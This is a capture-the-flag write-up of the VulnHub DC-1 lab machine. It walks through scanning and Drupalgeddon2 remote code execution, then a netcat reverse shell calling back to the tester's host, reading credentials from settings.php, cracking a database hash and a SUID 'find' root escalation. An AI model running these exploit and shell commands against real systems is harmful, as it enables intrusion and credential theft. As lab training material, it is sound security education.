# VulnHub DC-1 — Penetration Testing Write-Up

**Author:** Saurabh Tiwari

---

## 📌 Introduction

DC-1 is a beginner-level vulnerable machine from VulnHub designed to test web exploitation and privilege escalation skills.

This lab was solved **without using Metasploit**, relying entirely on manual enumeration, publicly available exploits, and command-line techniques.

---

## 1. Reconnaissance

### Host Discovery (Netdiscover)

To identify live hosts on the network, a subnet scan was performed:

```bash
sudo netdiscover -r 192.168.182.0/24
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/20ab61e7-d956-45ae-95a8-c16b8b56b4b0" />


**Result:**
The target machine was identified at **192.168.182.136**

---

### Nmap Scan

A detailed scan was conducted to identify open ports and services:

```bash
nmap -sC -sV -T4 192.168.182.136
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/c443738d-0c50-465d-838a-ec9b1c6dd40e" />


**Findings:**

* Port 22: SSH (OpenSSH)
* Port 80: HTTP (Apache Web Server)
* Port 111: RPCBind

---

## 2. Web Enumeration

### Nikto Scan

A Nikto scan was performed to identify web server misconfigurations:

```bash
sudo nikto -h http://192.168.182.136
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/cc52499f-64e2-4896-9483-a690aa72a3cf" />


**Key Findings:**

* Outdated Apache version
* Missing security headers
* PHP information disclosure
* Drupal CMS detected

These findings confirmed that the target was running a Drupal application, so further enumeration was focused on Drupal-specific vulnerabilities.

---

## 3. CMS Identification

Using browser analysis tools, the application was identified as:

* Drupal 7

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/92003b3e-1247-4946-a478-4048ec59f0c3" />


---

## 4. Vulnerability Identification

The identified Drupal version is vulnerable to:

* **CVE-2018-7600 (Drupalgeddon2)**
<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/5ccac571-5108-4c09-9e96-9985969a332c" />


This vulnerability allows **Remote Code Execution (RCE)** on the target system.

---

## 5. Exploitation — Remote Code Execution

### Clone Exploit

```bash
git clone https://github.com/pimps/CVE-2018-7600.git
cd CVE-2018-7600
```
<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/959969fe-5b9a-40ff-8f7d-426b6889c236" />

---

### Test Command Execution

```bash
python3 drupa7-CVE-2018-7600.py http://192.168.182.136 -c "whoami"
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/70dd7045-fc9c-4608-bcff-07c63ae49fb6" />



**Result:**

```bash
uid=33(www-data)
```

---

### Reverse Shell

A reverse shell was established:

```bash
nc -lvp 4444
```

```bash
python3 drupa7-CVE-2018-7600.py http://192.168.182.136 -c "nc -e /bin/bash 192.168.182.129 4444"
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/f21c605f-9dba-4a9f-b0d0-c10579b73b73" />


**Result:**
A shell was obtained as the `www-data` user.

---

## 6. Initial Access

To stabilize the shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/ec0ac51c-7416-4c1c-8922-29b3d98147d4" />


---

## 7. Flag 1

```bash
cd /var/www
ls
cat flag1.txt
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/86c7c830-6bc7-4f19-b74d-6c43eb453ee5" />


**Output:**

```
Every good CMS needs a config file - and so do you.
```

---

## 8. Credential Discovery

Sensitive configuration files were inspected:

```bash
cd /var/www/sites/default
cat settings.php
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/09e3e962-e8ea-4d68-a6c7-abdf344c6a8f" />


**Credentials Found:**

```
database: drupaldb  
username: dbuser  
password: R0ck3t  
```
<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/70aa6d90-2293-4618-b84c-005d921237a7" />


---

## 9. Database Enumeration

Using the discovered credentials:

```bash
mysql -u dbuser -p
```

```sql
show databases;
use drupaldb;
show tables;
select * from users;
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/d78396c9-f305-4d7f-bb94-67a93749729d" />


---

## 10. Password Cracking

The extracted password hash was cracked using an online tool.

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/1df40ee9-ea11-4650-a1dd-11b54128fe3e" />


**Recovered Password:**

```
53cr3t
```

---

## 11. Admin Access

Using the recovered credentials, access to the Drupal admin panel was obtained:

```
http://192.168.182.136
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/5e41c128-3a3d-4969-ace9-4be0421ff2d6" />


**Credentials:**

* Username: admin
* Password: 53cr3t
  
<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/ac3bbfdb-7aab-4825-b7ee-8c83734726c6" />

---

## 12. Flag 3

The next flag was discovered within the admin panel:

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/93f4042a-30a9-471b-bc7e-ec88219c3c58" />


```
Special PERMS will help FIND the passwd
```

---

## 13. Flag 4

```bash
cd /home
ls
cd flag4
ls
cat flag4.txt
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/727c8eb1-a05e-4ceb-8ebd-ff028a5c5ffe" />


**Output:**

```
Can you use this same method to find or access the flag in root?
Probably. But perhaps it's not that easy. Or maybe it is?
```

---

## 14. Privilege Escalation

### SUID Enumeration

To identify privilege escalation vectors:

```bash
find / -perm -u=s 2>/dev/null
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/9e2f7bcd-9f49-493e-b493-45f64decbd71" />


**Important Finding:**

```
/usr/bin/find
```

---

### Exploitation

The SUID binary was exploited:

```bash
find /dev -name null -exec /bin/sh \;
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/fde42e89-ad2a-46cc-b4f4-438c1a552ddc" />


This resulted in a shell with elevated privileges.

---

## 15. Root Access

```bash
cd /root
ls
cat thefinalflag.txt
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/bb6f9944-85f5-405c-9a86-ceed338edda5" />


**Output:**

```
Well done!!!!
```

---

## 16. Conclusion

This lab was completed entirely using manual techniques without relying on Metasploit. The attack chain demonstrated how web vulnerabilities, exposed credentials, and misconfigured system permissions can be combined to achieve full system compromise.

---

## 17. Key Takeaways

* CMS vulnerabilities can lead to Remote Code Execution
* Configuration files often expose sensitive credentials
* Database access is a critical pivot point
* SUID misconfigurations allow privilege escalation
* Proper enumeration is essential at every stage

---

## 🔗 Attack Chain Summary

Recon → Nmap → Web Enumeration → Drupal Detection → RCE → Shell Access → Credential Extraction → Database Access → Admin Login → Privilege Escalation → Root
